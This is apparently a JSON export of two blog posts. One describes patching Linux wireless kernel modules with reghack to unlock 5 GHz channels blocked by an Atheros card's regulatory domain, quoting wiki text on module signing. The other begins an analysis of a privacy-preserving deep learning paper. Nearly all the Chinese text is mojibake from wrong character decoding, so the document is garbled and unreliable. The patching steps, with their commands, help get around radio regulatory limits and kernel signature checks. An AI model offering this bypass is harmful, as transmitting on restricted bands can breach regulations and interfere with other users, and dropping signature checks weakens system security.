[{"title":"ä¿®æ”¹ç½‘å¡åœ°åŸŸé™åˆ¶","date":"2021-05-20T08:11:18.000Z","path":"2021/05/20/ä¿®æ”¹ç½‘å¡åœ°åŸŸé™åˆ¶/","text":"æœ¬æ–‡ä¸»è¦ä»‹ç»äº†åœ¨æ„å»ºè·¯ç”±å™¨æ—¶ä¸ºäº†ç ´è§£åœ°åŸŸé™åˆ¶çš„é€‰è·¯æœºåˆ¶çš„ç›¸å…³å·¥ä½œã€ ç ´è§£ç½‘å¡çš„ Regulatory Domainæˆ‘ä»¬ç½‘å¡çš„ ç‰ˆæœ¬å· 1Network controller: Qualcomm Atheros AR958x 802.11abgn Wireless Network Adapter (rev 01) [TOC] åˆ©ç”¨ reghack ä¿®æ”¹å†…æ ¸æ¨¡å— æ›¾ç»çš„ä¸€ä¸ªæ•™ç¨‹ ä¸åŒçš„å›½å®¶å’Œåœ°åŒºæœ‰ä¸åŒçš„æ— çº¿ç”µç®¡ç†è§„å®š(Regulatory Domain)ï¼Œå¯¹äºISM 5GHzé¢‘æ®µçš„åˆ’åˆ†ä¹Ÿæœ‰ä¸åŒçš„å‡†åˆ™ã€‚ Regulatory Domianæœ‰3å¤§æ—ï¼Œä»¥ç¾å›½ä¸ºä»£è¡¨çš„FCCï¼Œä»¥æ¬§ç›Ÿä¸ºä»£è¡¨çš„ETSIï¼Œä»¥åŠæ—¥æœ¬å†ä¸€æ¬¡ç‰¹ç«‹ç‹¬è¡Œçš„TELECï¼ˆæ— è®ºåœ¨èœ‚çªç½‘è¿˜æ˜¯WLANï¼Œæ—¥æœ¬ä¸€ç›´éƒ½æ˜¯ä¸ªæ€ªå¼‚çš„å­˜åœ¨ï¼‰ã€‚ä¸­å›½é‡‡ç”¨ETSIè§„å®šï¼Œå…·ä½“é¢‘æ®µç®¡ç†ä¸æ¬§ç›Ÿæœ‰æ‰€ä¸åŒã€‚ æ— çº¿ç½‘å¡é©±åŠ¨æ ¹æ®ISO-3166 alpha2è§„å®šçš„å›½å®¶ä»£ç ï¼ˆå¦‚ç¾å›½USï¼Œä¸­å›½CNï¼Œå¾·å›½DEï¼ŒéŸ©å›½KRï¼Œæ—¥æœ¬JPï¼‰ï¼Œå¯¹ç½‘å¡çš„å·¥ä½œé¢‘ç‡è¿›è¡Œç®¡ç†ã€‚ é«˜é€šAtherosåœ¨ç½‘å¡é©±åŠ¨çš„å…¬å…±éƒ¨åˆ†åŠ å…¥äº†Regulatory Doaminç®¡ç†çš„åŠŸèƒ½ã€‚é’ˆå¯¹é”€å¾€ä¸åŒå›½å®¶çš„ç½‘å¡äº§å“ï¼Œé€šè¿‡ç›´æ¥åœ¨ç½‘å¡èŠ¯ç‰‡çš„å¯æ“¦å†™å­˜å‚¨å™¨ï¼ˆEEPROMï¼‰ä¸­å†™å…¥ç›¸åº”çš„å›½å®¶ä»£ç ï¼Œé©±åŠ¨å·¥ä½œæ—¶è¯»å–è¯¥ä»£ç å¹¶å¼€å¯ç›¸åº”çš„å·¥ä½œé¢‘æ®µã€‚ ç”±äºé¡¹ç›®çš„éœ€æ±‚ï¼Œæˆ‘ä»¬ä¹°äº†å‡ å¼ Atheros 958xç³»åˆ—çš„æ— çº¿ç½‘å¡ï¼Œæ”¯æŒ2.4/5GHzåŒé¢‘æ®µï¼Œä½†æ˜¯å¾ˆé—æ†¾çš„æ˜¯è¿™æ‰¹ç½‘å¡5GHzçš„ä¸­é—´ä¸€æ®µä¸è¢«æ”¯æŒã€‚å›½å®¶ä»£ç å¯ä»¥é€šè¿‡ä¸‹åˆ—å‘½ä»¤å¯Ÿçœ‹ã€‚ 12$ dmesg | grep ath$ iwlist chan å°½ç®¡ä½¿ç”¨äº†iwå·¥å…·æ¥ä¿®æ”¹linuxç³»ç»Ÿçš„Regulatory Domainç®¡ç†éƒ¨åˆ†çš„å›½å®¶ä»£ç ï¼š 123$ iw reg set US$ iw reg get$ iwlist chan ä½†æ˜¯ç”±äºEEPROMçš„é™åˆ¶ï¼Œè¢«å±è”½çš„é¢‘æ®µæ€»æ˜¯æ— æ³•å¼€å¯ã€‚ ä¸ºäº†å¼€å¯å°½å¯èƒ½å¤šçš„5GHzé¢‘æ®µï¼Œåœ¨æ²¡æœ‰ç›´æ¥ä¿®æ”¹EEPROMçš„æ–¹æ³•çš„æƒ…å†µä¸‹ï¼Œæˆ‘åªèƒ½ä¿®æ”¹ç ´è§£é©±åŠ¨ä¸­å…³äºé¢‘æ®µç®¡ç†çš„éƒ¨åˆ†ã€‚Google åˆ°reghackåŠå…¶æºä»£ç ï¼Œå¹¶è¿›è¡Œé‡æ–°ç¼–è¯‘ 1root@linux: gcc reghack.c -o reghack å¦‚æœæ²¡æœ‰gcc è¿™æ ·å®‰è£… 1sudo apt-get install build-essential å®‰è£…çš„Ubuntu 12.04.4ç³»ç»Ÿæ˜¯linux 3.11å†…æ ¸ï¼Œlinux 3.7 å†…æ ¸å¼€å§‹åŠ å…¥äº†æ¨¡å—ç­¾ååŠéªŒè¯æœºåˆ¶ã€‚ä¸‹é¢çš„ç ´è§£è¿‡ç¨‹è™½ç„¶é¡ºåˆ©è¿›è¡Œï¼Œä½†é‡å¯ä¹‹åç ´è§£çš„æ— çº¿æ¨¡å—cfg80211.koå’Œath.koæ— æ³•åŠ è½½ï¼Œç½‘å¡ä¸èƒ½é©±åŠ¨ã€‚ 12345678root@linux:/home/user# ./reghack /lib/modules/3.11.0-15-generic/kernel/net/wireless/cfg80211.ko Patching @ 0x0004cf30: core world6 regdomain in cfg80211/reg.oroot@linux:/home/user# ./reghack /lib/modules/3.11.0-15-generic/kernel/drivers/net/wireless/ath/ath.ko Patching @ 0x00002110: ath world regdomain with 5 rules in ath/regd.oPatching @ 0x000021a0: ath world regdomain with 4 rules in ath/regd.oPatching @ 0x00002220: ath world regdomain with 3 rules in ath/regd.oPatching @ 0x00002280: ath world regdomain with 3 rules in ath/regd.oPatching @ 0x000022e0: ath world regdomain with 4 rules in ath/regd.o é™å›åˆ°linux 3.2å†…æ ¸å¦‚æœä½ çš„å†…æ ¸ç‰ˆæœ¬é»˜è®¤å°±æ˜¯ä½äº3.7å†…æ ¸ï¼Œå°±æ— éœ€è¿›è¡Œæ­¤æ“ä½œã€‚å†…æ ¸ç‰ˆæœ¬å¯Ÿçœ‹å‘½ä»¤ uname -a,ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ sudo apt-get install linux-image å°†linux 3.2å†…æ ¸åŠæºç ç­‰è‡ªåŠ¨ä¸‹è½½å®‰è£…ã€‚é‡å¯é€‰æ‹©Prevous Linux Versionsè¿›å…¥ï¼Œç„¶åé€‰æ‹©å¯ç”¨3.2å†…æ ¸ã€‚ä¸ºäº†å®‰å…¨èµ·è§ï¼Œå…ˆè¿›è¡Œå¤‡ä»½å¤„ç†ã€‚ 1234567891011user@linux:~$ gcc reghack.c -o reghackuser@linux:~$ sudo cp /lib/modules/3.2.0-60-generic/kernel/net/wireless/cfg80211.ko /lib/modules/3.2.0-60-generic/kernel/net/wireless/cfg80211.ko.backupuser@linux:~$ sudo cp /lib/modules/3.2.0-60-generic/kernel/drivers/net/wireless/ath/ath.ko /lib/modules/3.2.0-60-generic/kernel/drivers/net/wireless/ath/ath.ko.backupuser@linux:~$ sudo ./reghack /lib/modules/3.2.0-60-generic/kernel/drivers/net/wireless/ath/ath.koPatching @ 0x00001e10: ath world regdomain with 5 rules in ath/regd.oPatching @ 0x00001e90: ath world regdomain with 4 rules in ath/regd.oPatching @ 0x00001ef8: ath world regdomain with 3 rules in ath/regd.oPatching @ 0x00001f48: ath world regdomain with 3 rules in ath/regd.oPatching @ 0x00001f98: ath world regdomain with 4 rules in ath/regd.ouser@linux:~$ sudo ./reghack /lib/modules/3.2.0-60-generic/kernel/net/wireless/cfg80211.koPatching @ 0x00022c60: core world5 regdomain in cfg80211/reg.o ç ´è§£åçš„é¢‘æ®µè§å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829303132333435wlan0 32 channels in total; available frequencies : Channel 01 : 2.412 GHz Channel 02 : 2.417 GHz Channel 03 : 2.422 GHz Channel 04 : 2.427 GHz Channel 05 : 2.432 GHz Channel 06 : 2.437 GHz Channel 07 : 2.442 GHz Channel 08 : 2.447 GHz Channel 09 : 2.452 GHz Channel 10 : 2.457 GHz Channel 11 : 2.462 GHz Channel 36 : 5.18 GHz Channel 40 : 5.2 GHz Channel 44 : 5.22 GHz Channel 48 : 5.24 GHz Channel 52 : 5.26 GHz Channel 56 : 5.28 GHz Channel 60 : 5.3 GHz Channel 64 : 5.32 GHz Channel 100 : 5.5 GHz Channel 104 : 5.52 GHz Channel 108 : 5.54 GHz Channel 112 : 5.56 GHz Channel 116 : 5.58 GHz Channel 132 : 5.66 GHz Channel 136 : 5.68 GHz Channel 140 : 5.7 GHz Channel 149 : 5.745 GHz Channel 153 : 5.765 GHz Channel 157 : 5.785 GHz Channel 161 : 5.805 GHz Channel 165 : 5.825 GHz Current Frequency:2.437 GHz (Channel 6) ç¼–è¯‘å†…æ ¸æ¨¡å—linuxå†…æ ¸ä»3.7 å¼€å§‹åŠ å…¥æ¨¡å—ç­¾åæ£€æŸ¥æœºåˆ¶ï¼Œå¦‚æœå†…æ ¸é€‰é¡¹CONFIG_MODULE_SIGå’ŒCONFIG_MODULE_SIG_FORCEæ‰“å¼€çš„è¯ï¼Œå½“åŠ è½½æ¨¡å—æ—¶å†…æ ¸ä¼šæ£€æŸ¥æ¨¡å—çš„ç­¾åï¼Œå¦‚æœç­¾åä¸å­˜åœ¨æˆ–è€…ç­¾åå†…å®¹ä¸ä¸€è‡´ï¼Œä¼šå¼ºåˆ¶é€€å‡ºæ¨¡å—çš„åŠ è½½ã€‚æ‰€ä»¥ä¸ºæ¨¡å—ç­¾åå°±å°¤ä¸ºé‡è¦ã€‚å¦‚æœæ˜¯å†…æ ¸é€‰é¡¹CONFIG_MODULE_SIG_ALLæ‰“å¼€ï¼Œå†…æ ¸ç¼–è¯‘æ¨¡å—æ—¶ä¼šè‡ªåŠ¨ä¸ºæ¨¡å—ç­¾åã€‚å¦åˆ™å°±è¦è‡ªå·±å¯¹æ¨¡å—ç­¾åã€‚ é¦–å…ˆæˆ‘ä»¬å°±è¦æƒ³åˆ°ç”¨ä»€ä¹ˆç­¾åå·¥å…·ï¼Œå› ä¸ºç­¾åæœºåˆ¶ä»3.7 å†…æ ¸æ‰åŠ å…¥ï¼Œæ‰€ä»¥ä¸ºæ¨¡å—ç­¾åçš„èµ„æ–™å°‘ä¹‹åˆå°‘ï¼Œæˆ‘æ‰¾äº†å¾ˆé•¿æ—¶é—´ä¹Ÿæ²¡æœ‰å¤´ç»ªï¼Œç½‘ä¸Šè¯´çš„æœ€å¤šçš„éƒ½æ˜¯opensslæ¥åšç­¾åã€‚æ‰€ä»¥ç†æ‰€å½“ç„¶çš„æˆ‘ä¹Ÿä½¿ç”¨opensslæ¥åšç­¾åï¼Œä½†æ˜¯å®ƒæ˜¯linuxå†…æ ¸ä¹‹å¤–çš„å·¥å…·ï¼Œå°±ç®—ç”Ÿæˆç­¾åï¼Œä½ è¿˜è¦æ‰‹åŠ¨æ·»åŠ åˆ°æ¨¡å—.koæ–‡ä»¶æœ€åï¼Œè¿˜è¦è®¾ç½®ä¸€äº›å†…æ ¸è¦æ£€æŸ¥çš„å›ºå®šç»“æ„ä½“(ä¾‹å¦‚ï¼šsignature_moduleç»“æ„)ï¼Œå¾ˆæ˜¯éº»çƒ¦ï¼Œå¹¶ä¸”å†…æ ¸çš„keyä½ æ‹¿ä¸åˆ°ï¼Œç”¨çš„ä¸æ˜¯å†…æ ¸çš„å¯ä»¥ç­¾åè‚¯å®šé€šä¸è¿‡æ£€æŸ¥ã€‚æ‰€ä»¥è¿™ç§æ–¹æ³•è‡³å°‘æˆ‘è®¤ä¸ºä¸å¯è¡Œã€‚ æœ‰ä¸€ç¯‡è‹±æ–‡èµ„æ–™æ¯”è¾ƒå¥½ Signed kernel module supportFrom Gentoo Wiki Jump to: navigation, search Since Linux kernel version 3.7 onwards, support has been added for signed kernel modules. When enabled, the Linux kernel will only load kernel modules that are digitally signed with the proper key. This allows further hardening of the system by disallowing unsigned kernel modules, or kernel modules signed with the wrong key, to be loaded. Malicious kernel modules are a common method for loading rootkits on a Linux system. Contents [hide] 1 Enabling module signature verification1.1 Configuring module signature verification1.2 Building the kernel with proper keys1.3 Validating module signature support2 Administering kernel module signatures2.1 Protecting the private key2.2 Manually signing modules2.3 Distributing the kernel and modules3 More resources Enabling module signature verificationEnabling support is a matter of toggling a few settings in the Linux kernel configuration. Unless you want to use your own keypair, this is all that has to be done to enable kernel module support. Configuring module signature verificationModule signature verification is a kernel feature, so has to be enabled through the Linux kernel configuration. You can find the necessary options under Enable loadable module support. [Collapse] Kernel configuration Enable module signature verification 12345--- Enable loadable module support[*] Module signature verification[*] Require modules to be validly signed[*] Automatically sign all modules Which hash algorithm should modules be signed with? (Sign modules with SHA-512) ---&gt; The option Module signature verification (CONFIG_MODULE_SIG) enables the module signature verification in the Linux kernel. It supports two approaches on signed module support: a rather permissive one and a strict one. By default, the permissive approach is used, which means that the Linux kernel module either has to have a valid signature, or no signature. With the strict approach, a valid signature must be present. In the above example, the strict approach is used by selecting Require modules to be validly signed (CONFIG_MODULE_SIG_FORCE). Another way of enabling this strict approach is to set the kernel boot option enforcemodulesig=1. When building the Linux kernel, the kernel modules will not be signed automatically unless you select Automatically sign all modules(CONFIG_MODULE_SIG_ALL). Finally, we need to select the hash algorithm to use with the cryptographic signature. In the above example, we use SHA-512. Building the kernel with proper keysWhen the Linux kernel is building with module signature verification support enabled, then you can use your own keys or have the Linux kernel build infrastructure create a set for you. If you want the Linux kernel build infrastructure to create it for you, just continue as you always do with a make and make modules_install. At the end of the build process, you will notice that signing_key.priv and signing_key.x509 will be available on the root of the Linux kernel sources. If we want to use our own keys, you can use openssl to create a key pair (private key and public key). The following command, taken from kernel/Makefile, creates such a key pair. [Collapse] File x509.genkey Key generation configuration file 1234567891011121314151617[ req ]default_bits &#x3D; 4096distinguished_name &#x3D; req_distinguished_nameprompt &#x3D; nostring_mask &#x3D; utf8onlyx509_extensions &#x3D; myexts [ req_distinguished_name ]O &#x3D; GenFicCN &#x3D; Kernel Signing KeyemailAddress &#x3D; server.support@genfic.com [ myexts ]basicConstraints&#x3D;critical,CA:FALSEkeyUsage&#x3D;digitalSignaturesubjectKeyIdentifier&#x3D;hashauthorityKeyIdentifier&#x3D;keyid user $ openssl req -new -nodes -utf8 -sha512 -days 36500 -batch -x509 -config x509.genkey -outform DER -out signing_key.x509 -keyout signing_key.priv The resulting files need to be stored as signing_key.x509 and signing_key.priv in the root of the Linux kernel source tree. The public key part will be build inside the Linux kernel. If you configured the kernel to sign modules, this signing will take place during the make modules_install part. Validating module signature supportReboot with the newly configured kernel. In the output of dmesg you should be able to confirm that the proper certificate is loaded: user $ dmesg | grep MODSIGN 1[ 2.450021] MODSIGN: Loaded cert &#39;GenFic: Kernel Signing Key: b923a5f44eae25bbad52c8bf2742e7b7e6fb0c0e&#39; The kernel modules have the digital signature appended at the end. A simple hexdump can confirm if a signature is present or not: user $ hexdump -C vxlan.ko | tail 1234567891000008880 cf 0e e7 cb 10 9e 98 5f 4b 21 d4 03 ba 3d 7e e7 |......._K!...&#x3D;~.|00008890 68 db f9 e3 5f 62 3c c7 d6 6c 84 c7 d6 68 c1 73 |h..._b&lt;..l...h.s|000088a0 3d d7 5a 38 66 99 12 b8 84 c9 84 45 dd 68 6d 17 |&#x3D;.Z8f......E.hm.|000088b0 03 24 dc 9c 6f 6d 11 01 e9 74 82 ea b5 5b 46 07 |.$..om...t...[F.|000088c0 fe dd 66 97 1a 33 58 3d 6e d0 ac 03 08 16 73 06 |..f..3X&#x3D;n.....s.|000088d0 9f 90 c4 eb b3 82 1d 9f 48 8c 5b 51 01 06 01 1e |........H.[Q....|000088e0 14 00 00 00 00 00 02 02 7e 4d 6f 64 75 6c 65 20 |........~Module |000088f0 73 69 67 6e 61 74 75 72 65 20 61 70 70 65 6e 64 |signature append|00008900 65 64 7e 0a |ed~.|00008904 The string Module signature appended at the end confirms that a signature is present. Of course, it does not confirm that the signature is valid or not. To remove the signature, we can use the strip command: root # strip â€“strip-debug vxlan.koroot # hexdump -C vxlan.ko | tail 1234567891000097330 6c 5f 67 65 74 5f 73 74 61 74 73 36 34 00 72 63 |l_get_stats64.rc|00097340 75 5f 62 61 72 72 69 65 72 00 5f 72 61 77 5f 73 |u_barrier._raw_s|00097350 70 69 6e 5f 75 6e 6c 6f 63 6b 00 72 65 67 69 73 |pin_unlock.regis|00097360 74 65 72 5f 70 65 72 6e 65 74 5f 64 65 76 69 63 |ter_pernet_devic|00097370 65 00 6b 6d 61 6c 6c 6f 63 5f 63 61 63 68 65 73 |e.kmalloc_caches|00097380 00 6e 65 74 64 65 76 5f 69 6e 66 6f 00 6e 65 69 |.netdev_info.nei|00097390 67 68 5f 6c 6f 6f 6b 75 70 00 72 65 6c 65 61 73 |gh_lookup.releas|000973a0 65 5f 73 6f 63 6b 00 72 65 67 69 73 74 65 72 5f |e_sock.register_|000973b0 6e 65 74 64 65 76 69 63 65 00 |netdevice.|000973ba If we try to load this module now, we get a failure: root # modprobe vxlan 1modprobe: ERROR: could not insert &#39;vxlan&#39;: Required key not available This confirms that modules without a signature are not loaded. Administering kernel module signaturesOnce the kernel boots and we have validated that the signed kernel module support works, it is important to correctly handle the keys themselves. Protecting the private keyThe private key, stored as signing_key.priv, needs to be moved to a secure location (unless you will be creating new keys for new kernels, in which case the file can be removed). Do not keep it at /usr/src/linux on production systems as malware can then easily use this key to sign the malicious kernel modules (such as rootkits) and compromise the system further. Manually signing modulesIf you ever need to manually sign a kernel module, you can use the scripts/sign-file script available in the Linux kernel source tree. It requires four arguments: The hash algorithm to use, such as sha512 The private key location The certificate (which includes the public key) location The kernel module to sign In this case, the key pair does not need to be named signing_file.priv and such, nor do they need to be in the root of the Linux kernel source tree location. user $ perl /usr/src/linux/scripts/sign-file sha512 /mnt/sdcard/kernel-signkey.priv /mnt/sdcard/kernel-signkey.x509 vxlan.ko Distributing the kernel and modulesIf we create a kernel package through make tarbz2-pkg, the modules in it will be signed already so we do not need to manually sign them afterwards. The signing keys themselves are not distributed with it. More resourcesIn Booting a self-signed Linux kernel Greg Kroah-Hartman describes how to boot a self-signed Linux kernel from EFI. As having signed kernel module support is only secure if the Linux kernel is trusted, this is an important (and related) feature to work with. ä¸€ä¸ªå…³é—­ç­¾åçš„æ¡ˆä¾‹ï¼š é¢ä¸´çš„é—®é¢˜æˆåŠŸç‡ä¸èƒ½ä¿è¯ è€ç‰ˆæœ¬çš„reghackä¸ç¡®å®šå¯¹æ–°ç‰ˆæœ¬çš„å†…æ ¸æ¨¡å—æœ‰ç”¨ï¼Œå¯èƒ½éœ€è¦äº†è§£ä¿®æ”¹çš„åŸç† å†…æ ¸ç¼–è¯‘æ—¶éœ€è¦å…³é—­å¯†é’¥éªŒè¯æœºåˆ¶ï¼Œæ˜¯å¦å¯¹å®‰å…¨æ€§æœ‰å½±å“ æ–°çš„ Reghackè¯¥æ–¹æ³•ä¼˜ç‚¹æ˜¯çœ‹èµ·æ¥ååˆ†çš„æ¸…æ™°å…¨é¢ï¼Œæ„Ÿè§‰æˆåŠŸç‡æœ‰ä¿è¯ï¼Œç¼ºç‚¹æ˜¯æœ‰é’ˆå¯¹æ€§çš„æ˜¯é’ˆå¯¹wdr4310v1ï¼Œä½†é«˜å…´çš„æ˜¯è¯¥è·¯ç”±å™¨çš„wirelessç¡¬ä»¶å°±æ˜¯Atheros AR9580,å¯èƒ½å°±æ˜¯ä¸€æ ·çš„ï¼Œä½†è¿˜æ˜¯éœ€è¦è‡ªå·±çš„ART fileï¼Œä¸”ä»–æ˜¯åŸºäºAR9300çš„ï¼Œä¸”LEDE-openwrtå¥½åƒä¸æ”¯æŒæˆ‘ä»¬è¿™ä¸ªç¡¬ä»¶ã€‚ ä»“åº“åœ°å€ æ›´æ”¹EEPROMåˆ©ç”¨ atheepmgr æŸ¥çœ‹EEPROMåœ¨linuxç¼–è¯‘çš„æ—¶å€™è®¾ç½®äº†æƒé™ æ²¡æœ‰åŠæ³•dumpå’Œæ›´æ”¹ã€‚","link":"","tags":[{"name":"WIFI","slug":"WIFI","permalink":"https://dingiso.github.io/tags/WIFI/"}]},{"title":"privacy-preserving deep-learning via weight Transmission","date":"2021-03-20T11:42:37.000Z","path":"2021/03/20/Transmission/","text":"æœ¬æ–‡é’ˆå¯¹ã€ŠPrivacy-Preserving Deep Learning via Weight Transmissionã€‹è¯¥ç¯‡è®ºæ–‡è¿›è¡Œäº†åˆ†æ æ¯”è¾ƒå…¨é¢ è®ºæ–‡é¢˜ç›®ç†è§£æœ¬æ–‡è®¾ç«‹äº†ä¸€ä¸ªèƒ½ä¿æŠ¤éšç§çš„æ·±åº¦å­¦ä¹ ç®—æ³•ï¼Œæ ¹æ®æœ¬æ–‡çš„å†…å®¹ï¼Œæˆ‘å°†åŸé¢˜ç›®ã€ŠPrivacy-Preserving Deep Learning via Weight Transmissionã€‹æ‰©å±•ä¸ºã€ŠPrivacy-preserving SGD for distributed trainers via weight transmissionã€‹å³é€šè¿‡æƒé‡ä¼ è¾“å®ç°çš„é’ˆå¯¹åˆ†å¸ƒå¼è®­ç»ƒè€…çš„éšç§ä¿æŠ¤éšæœºæ¢¯åº¦ä¸‹é™ç®—æ³•ï¼Œé€šè¿‡å¯¹é¢˜ç›®çš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“æœ¬æ–‡çš„ä¹¦å†™ç¯å¢ƒå’Œç›®çš„å¦‚ä¸‹ï¼š ç®—æ³• ï¼šSGD éšæœºæ¢¯åº¦ä¸‹é™ ç›®çš„ ï¼šéšç§ä¿æŠ¤ ç¯å¢ƒ ï¼šåˆ†å¸ƒå¼ç¥ç»ç½‘è·¯ &amp; æ·±åº¦å­¦ä¹  è®ºæ–‡èƒŒæ™¯çŸ¥è¯†èƒŒæ™¯çŸ¥è¯†ä¸€ï¼šæœ¬æ–‡æ˜¯åœ¨SGDéšæœºæ¢¯åº¦ä¸‹é™ç®—æ³•çš„åŸºç¡€ä¸Šè¿›è¡Œæ”¹è¿›å’Œæ‰©å±•çš„ã€‚ä¸ºäº†ä»‹ç»SGDï¼Œæˆ‘ä»¬é¦–å…ˆä»‹ç»ä¸€ä¸‹GDæœ€é€Ÿæ¢¯åº¦ä¸‹é™ç®—æ³•-Gradient Descentï¼Œè¯¥ç®—æ³•æ˜¯é€šè¿‡è®¡ç®—ç»™å®šæ•°æ®é›†çš„å¯¼æ•°ï¼Œä½¿å‡½æ•°ä¸æ–­æ”¶æ•›è‡³Jå‡½æ•°-cost functionçš„æœ€å°å€¼ï¼Œå¾—åˆ°ç»“æœï¼Œè¯¥æ–¹æ³•çš„å…·ä½“æ•°å­¦å…¬å¼ä¸º$$x_{t+1} = x_t - \\eta_t\\nabla f(x_t)$$å…¶ä¸­$\\eta_t$ä¸ºæ­¥é•¿ï¼Œ ä¸º$\\nabla f(x_t)$å¯¼æ•°ï¼Œè¯¥æ–¹æ³•æœ‰ä¸¤ä¸ªç¼ºç‚¹ï¼š ä¸ºäº†ä¿è¯å‡†ç¡®æ€§$\\nabla f(x_t)$éœ€è¦æ˜¯ä¸€ä¸ªç²¾ç¡®çš„å¯¼æ•°ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œå¾ˆå¤šæ¬¡è¿­ä»£çš„è¿ç®—æ‰èƒ½å¾—åˆ°ç»“æœ è¯¥æ–¹æ³•æ— æ³•é€ƒç¦»éç‚¹å’Œå±€éƒ¨æœ€ä¼˜ç‚¹è¿™ç§å¯¼æ•°ä¸º0ä½†æ˜¯ä¸æ˜¯æœ€å°å€¼çš„ç‚¹ã€‚ å› æ­¤æˆ‘ä»¬å¼•å…¥äº†SGDç®—æ³•ï¼Œè¯¥ç®—æ³•ä¸ºéšæœºæœ€é€Ÿä¸‹é™ç®—æ³•-Stochastic Gradient Descentã€‚ä»–çš„ä¸»è¦æ€æƒ³æ˜¯åˆ©ç”¨åŒ…å«å™ªå£°çš„å…·æœ‰éšæœºæ€§çš„å¯¼æ•°ä½¿å¾—ä¸‹é™è¿‡ç¨‹ä¸ç»è¿‡éç‚¹å’Œå±€éƒ¨æœ€ä¼˜ç‚¹ã€‚å…¶ä¸­éšæœºå¯¼æ•°ä»…è¦æ±‚æœŸæœ›ä¸ºå•æ•°å³å¯ï¼Œæ•°å­¦è¡¨è¾¾ä¸º ã€‚è¯¥æ–¹æ³•çš„å…¨éƒ¨æ•°å­¦è¡¨è¾¾ä¸ºï¼š$$G_t = \\frac{\\delta J(W_{t-1},X_t,Y_t)}{\\delta W} \\\\W_t = W_{t-1} - \\alpha(t)Â·G_t$$å…¶ä¸­ J å‡½æ•°ä¸ºcost functionï¼Œå³å¯¹ç»“æœä¼˜è‰¯æ€§çš„è¡¡é‡å‡½æ•°ï¼ŒWä¸ºæƒå€¼å‚æ•°ï¼Œæ˜¯æ¯ä¸€ä¸ªå±æ€§å¯¹ç»“æœçš„æƒé‡å½±å“ã€‚$\\alpha_t$ä¸ºæ­¥é•¿,$G_t$ä¸ºéšæœºå¯¼æ•°ã€‚ç›¸æ¯”äºGDï¼ŒSGDæœ‰ä»¥ä¸‹çš„ä¼˜è‰¯ç‰¹æ€§ï¼š å¯¼æ•°å¯ä»¥åŒ…å«å™ªå£°ï¼Œæ‰€ä»¥ç®—å¾—å¾ˆå¿«ï¼Œä¸”å¤§é‡çš„ç†è®ºå·¥ä½œè¯´æ˜ï¼Œåªè¦å™ªå£°ä¸ç¦»è°±ï¼Œå…¶å®ï¼ˆè‡³å°‘åœ¨fæ˜¯å‡¸å‡½æ•°çš„æƒ…å†µä¸‹ï¼‰ï¼ŒSGDéƒ½èƒ½å¤Ÿå¾ˆå¥½åœ°æ”¶æ•›ã€‚ å®ƒèƒ½å¤Ÿè‡ªåŠ¨é€ƒç¦»éç‚¹ï¼Œè‡ªåŠ¨é€ƒç¦»æ¯”è¾ƒå·®çš„å±€éƒ¨æœ€ä¼˜ç‚¹ã€‚ æœ€åæ‰¾åˆ°çš„ç­”æ¡ˆè¿˜å…·æœ‰å¾ˆå¼ºçš„ä¸€èˆ¬æ€§ï¼ˆgeneralizationï¼‰ï¼Œå³èƒ½å¤Ÿåœ¨è‡ªå·±ä¹‹å‰æ²¡æœ‰è§è¿‡ä½†æ˜¯æœä»åŒæ ·åˆ†å¸ƒçš„æ•°æ®é›†ä¸Šè¡¨ç°éå¸¸å¥½ã€‚ è¿™äº›ä¼˜è‰¯çš„æ€§è´¨ä½¿å¾—SGDæˆä¸ºæ·±åº¦å­¦ä¹ é¢†åŸŸè¾ƒä¸ºæ™®éä¸”ä¼˜è‰¯çš„ç®—æ³• ï¼Œè¿™ä¹Ÿæ˜¯æœ¬æ–‡é€‰æ‹©è¿™ä¸ªç®—æ³•çš„åŸå› ä¹‹ä¸€ã€‚ æœ¬æ–‡è¿˜æœ‰å…¶ä»–æœ‰å…³éšç§ä¿æŠ¤Privacy-preservingçš„èƒŒæ™¯çŸ¥è¯†ä¸ºï¼š Honest-but-Curiousé¦–å…ˆæœ¬æ–‡å‡å®šserveræ˜¯è¯šå®ä½†å¥½å¥‡çš„(honest-but-curious)ï¼Œè¯¥æ¨¡å‹åˆè¢«ç§°ä¸ºåŠè¯šå®æ¨¡å‹(semi-Honest model)ï¼Œå…¶ä¸­ è¯šå®æ„ä¸ºç»“ç‚¹ä¼šè¯šå®çš„å°†ä»–çš„å·¥ä½œå…¨éƒ¨å®Œæˆï¼Œ å¥½å¥‡æ„å‘³ç€ç»“ç‚¹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šå°†ä»–æ‰€æœ‰çš„æ•°æ®å…¨éƒ¨ä¿å­˜ä¸‹æ¥å¹¶åœ¨åç»­æ—¶åˆ©ç”¨ä»–ä»¬è¿›è¡Œæ¨æµ‹æ”»å‡»ã€‚ Collusionç›¸å…³çš„ï¼Œæœ¬æ–‡å‡å®šçš„æ”»å‡»è¿˜æœ‰ï¼Œtrainerå’Œserverå°†ä¼šæ˜¯ä¸€ä¼™çš„ï¼Œä»–ä»¬ä¹‹é—´å¯ä»¥è¿›è¡Œå…±è°‹(collusion)æ¥å¯¹æ•°æ®è¿›è¡Œæ”»å‡»ã€‚ è®ºæ–‡çš„ä¸»è¦è´¡çŒ® èˆå¼ƒäº†ä¼ ç»Ÿæ¢¯åº¦ä¼ è¾“çš„æ–¹æ³•è€Œé€‰ç”¨æƒå€¼ä¼ è¾“æ¥å¤§å¹…æé«˜å®‰å…¨æ€§ã€‚ æœ¬æ–‡ä½¿ç”¨çš„æ–¹æ³•é€‚ç”¨äºæ·±åº¦å­¦ä¹ é€‚ç”¨çš„æ‰€æœ‰æ¿€æ´»å‡½æ•°ï¼Œè¿™æ„å‘³ç€ä¸ä¼šé€‚ç”¨è¿‘ä¼¼ç®—æ³•ã€‚ æœ¬æ–‡é€šè¿‡ä¸¥æ ¼çš„ç†è®ºè¯æ˜è¯šå®ä½†å¥½å¥‡çš„serverå’Œæç«¯å…±è°‹ï¼Œå³åªæœ‰ä¸€ä¸ªtrainerå¯ä¿¡çš„æƒ…å†µä¸‹ï¼Œæœ¬æ–‡çš„æ–¹æ³•ä¾ç„¶æœ‰æé«˜çš„å®‰å…¨æ€§ã€‚ 